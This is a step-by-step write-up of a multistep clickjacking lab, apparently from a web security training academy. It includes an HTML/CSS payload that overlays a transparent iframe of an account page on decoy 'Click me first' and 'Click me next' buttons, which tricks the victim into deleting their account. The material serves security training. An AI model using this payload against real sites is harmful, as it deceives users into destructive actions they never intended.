# Multistep clickjacking
* This lab has some account functionality that is protected by a CSRF tokens and alos has a confirmation dialog to protect against Clickjacking.
	* To solve this lab, construct an attack that fools the user into clicking the delete account button and the confirmation dialog by clicking on "Click me first" and "Click me next" decoy actions. You will need to use two elements for this lab.
	* You can log in to your own account using the following credentials: `wiener:peter`

### 1. Enumerate the webpage
* Using the provided credentials for _wiener_ to login and enumerate the web page.
	* Delete account function is found from `/my-account`

![21](https://user-images.githubusercontent.com/53956303/154179164-9d53574d-e89f-429e-a081-c2dab639b149.png)
* Confirmation message for deleting a user is found from `/my-account/delete`

![22](https://user-images.githubusercontent.com/53956303/154179239-05337e3b-2039-4266-bc33-83a5f70185d6.png)
### 2. Use the provided exploit server to make a malicious HTML to do the multistep clickjacking
```html
<style>
	iframe {
		position:relative;
		width:500px;
		height:700px;
		opacity:0.1;
		z-index: 2;
	}
	.firstClick, .secondClick {
		position:absolute;
		top:300px;
		left:80px;
		z-index:1;
	}
	.secondClick {
		top:300px;
		left:80px;
	}
</style>
<div class="firstClick">TEST me first</div>
<div class="secondClick">Test me next</div>
<iframe src="https://ac8b1f5c1f1dab7bc00b242000bb0070.web-security-academy.net/my-account"></iframe>
```
* Store and view the exploit

![23](https://user-images.githubusercontent.com/53956303/154180113-6def3eee-a440-4fdc-b1a0-5bda18efefc9.png)
### 3.Modify the position of _.firstClick_
* change the values of `.fristClick` first to adjust the position.
	*  Modify the _top_ value to 500px and _left_ value to 70px, the position is successfully adjusted.

![24](https://user-images.githubusercontent.com/53956303/154180374-11b810f6-a698-48cd-a234-d8c4e1338fe1.png)
### 4.Modify the position of _.secondClick_
* Click the "Test me first" to move forward to next setp in the "view exploit" and Change the value of `.secondClick` to adjust the position.
	* Modify the _top_ to 295px and _left_ to 215px, the position is successfully adjusted.

![25](https://user-images.githubusercontent.com/53956303/154180912-3e019c1c-8f10-4862-8329-6fb0f97e18fd.png)
### 5. Modify the exploit to be triggered
* Change all the "Test" to "Click" to be triggered in this lab.

![26](https://user-images.githubusercontent.com/53956303/154181100-c488d9d1-6819-49f6-b282-c5c80f2c703e.png)
* Then, click "store" and dilver the exploit by clicking "Deliver exploit to victim" button.
	* As a result, the lab is solved

![27](https://user-images.githubusercontent.com/53956303/154181202-f26ef1d5-708e-4f79-bbbd-183ea79ab7c8.png)
